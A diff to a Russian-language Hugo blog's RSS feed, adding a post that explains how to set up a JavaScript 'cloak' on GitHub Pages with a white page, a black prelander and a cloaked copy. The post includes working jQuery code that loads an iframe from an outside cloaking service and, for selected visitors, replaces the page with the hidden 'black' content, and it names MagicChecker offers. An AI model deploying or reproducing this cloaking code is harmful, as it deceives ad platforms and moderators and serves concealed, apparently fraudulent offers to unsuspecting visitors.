@@ -6,10 +6,20 @@
     <description>Recent content on Croco Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>ru-RU</language>
-    <lastBuildDate>Fri, 25 Oct 2019 16:41:05 +0300</lastBuildDate>
+    <lastBuildDate>Fri, 25 Oct 2019 17:31:01 +0300</lastBuildDate>
     
 	<atom:link href="https://deniszhitnyakov.github.io/crocoblog/public/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Настройка JS клоаки</title>
+      <link>https://deniszhitnyakov.github.io/crocoblog/public/posts/github-klo/</link>
+      <pubDate>Fri, 25 Oct 2019 17:31:01 +0300</pubDate>
+      
+      <guid>https://deniszhitnyakov.github.io/crocoblog/public/posts/github-klo/</guid>
+      <description>Вводные В корне гитхаба должно быть 3 файла:
+ файл w.html - это белая страница файл black.html - это прокладка файл blog.html - это копия белой страницы с клоакой, на которую будет идти трафик  Установка клоаки  Отредактировать код: $(function () { $(&amp;#39;body&amp;#39;).append(&amp;#39;&amp;lt;iframe src=&amp;#34;https://beta.dolphin.ru.com/magic/ОФФЕР.php?domain=ДОМЕН-GITHUB&amp;amp;path=ИМЯ-РЕПОЗИТОРИЯ&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;#39;); setTimeout(function () { var html = $(&amp;#39;iframe&amp;#39;).contents().find(&amp;#39;html&amp;#39;).html(); var frameLocation = window.frames[0].location.href; if (frameLocation.search(&amp;#39;black.html&amp;#39;) != -1) { document.open(); document.write(html); document.close(); } $(&amp;#39;iframe&amp;#39;).remove(); }, 1500); }); Офферы, которые добавлены в MagicChecker:  m4l-sus.</description>
+    </item>
     
     <item>
       <title>Настройка лендинга</title>
